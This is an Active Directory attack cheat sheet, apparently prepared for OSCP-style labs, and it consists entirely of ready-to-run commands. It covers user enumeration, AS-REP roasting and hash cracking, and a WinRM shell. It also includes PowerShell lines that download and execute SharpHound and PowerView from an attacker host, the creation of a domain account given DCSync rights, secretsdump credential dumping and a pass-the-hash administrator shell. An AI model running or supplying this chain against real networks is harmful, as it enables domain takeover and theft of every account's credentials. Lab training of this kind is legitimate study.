# Build users.txt from RPC quickly

```bash
rpcclient -U "" -N $IP -c 'enumdomusers' | grep -oP '(?<=user:\[)[^\]]+' | sort -u > users.txt
```

# RootDSE → baseDN, then pull users → users.txt

```bash
ldapsearch -x -H ldap://$IP -b "" -s base namingContexts
ldapsearch -x -H ldap://$IP -b "$BASEDN" '(&(objectCategory=person)(objectClass=user))' sAMAccountName \
  | awk '/^sAMAccountName:/{print $2}' | grep -vi '\$$' | sort -u > users.txt
```

# AS-REP roast & crack

```bash
GetNPUsers.py $DOM/ -usersfile users.txt -dc-ip $IP -request -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --status
```

# WinRM shell

```bash
evil-winrm -i $IP -u $USER -p '$PASS'
```

# Load SharpHound and collect

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://$ATTACKER:8000/SharpHound.ps1")
Invoke-BloodHound -CollectionMethod All -Domain $DOM -LDAPUser $USER -LDAPPass '$PASS' -OutputDirectory $env:TEMP
download $env:TEMP\*.zip .
```

# PowerView DCSync ACE (after group add)

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://$ATTACKER:8000/PowerView.ps1")
net user oscp 'P@ssw0rd123!' /add /domain
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members 'oscp'
$SecPass = ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force
$Cred    = New-Object System.Management.Automation.PSCredential("$DOM\oscp", $SecPass)
Add-DomainObjectAcl -TargetIdentity $DOM -Rights DCSync -PrincipalIdentity 'oscp' -Credential $Cred
```

# DCSync dump and admin shell (PtH)

```bash
secretsdump.py $DOM/oscp:'P@ssw0rd123!'@$IP
wmiexec.py -hashes :<NTLM_HASH> $DOM/Administrator@$IP
```
